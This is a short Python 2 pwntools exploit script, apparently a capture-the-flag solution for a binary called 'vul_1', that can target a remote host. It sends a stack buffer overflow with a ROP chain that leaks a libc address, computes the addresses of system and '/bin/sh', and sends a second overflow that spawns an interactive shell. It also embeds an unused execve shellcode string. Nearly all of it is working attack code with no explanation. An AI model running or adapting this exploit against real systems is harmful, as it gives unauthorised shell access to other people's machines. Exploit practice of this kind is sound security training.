#!/usr/bin/env python2
#coding:utf-8

from pwn import *
import os,sys

Debug = 0
if Debug:
	io = process('./vul_1')
# context(log_level = 'debug')

else:
	io = remote(sys.argv[1],int(sys.argv[2]))
#gdb.attach(io)



def exp():
	
	
	ret = io.recvuntil('Input your data:')
	print ret
	sc = '''\xeb\x1f\x5e\x89\x76\x09\x31\xc0\x88\x46\x08\x89\x46\x0d\xb0\x0b
    	\x89\xf3\x8d\x4e\x09\x8d\x56\x0d\xcd\x80\x31\xdb\x89\xd8\x40\xcd
    	\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6b\x73\x68\x00\xc9\xc3'''
	#payload = 'A'*0x1c+p32(0x08048358)
	#io.sendline(payload)
	#ret = io.recvuntil('Input your data:')
	#print ret
	#payload = 'A'*0x1c+p32(0x0804846D)+p32(0x1)+p32(0x0804A00C)+p32(0x8)
	payload = 'A'*0x1c+p32(0x08048340)+p32(0x0804844d)+p32(0x1)+p32(0x0804A00C)+p32(0x8)
	io.sendline(payload)
	ret = io.recvuntil('Input your data:')
	
	print ret
	gt = u32(ret[:4])
	print hex(gt)
	system_addr = gt - (0xdaf60 - 0x40310)
	binsh_addr = gt - (0xdaf60 - 0x16084c)
	payload = 'A'*0x14+p32(system_addr)+p32(0x33333333)+p32(binsh_addr)
	io.sendline(payload)
	raw_input('pause')
	# pause()


	io.interactive()
	return

if __name__ == '__main__':

	exp()
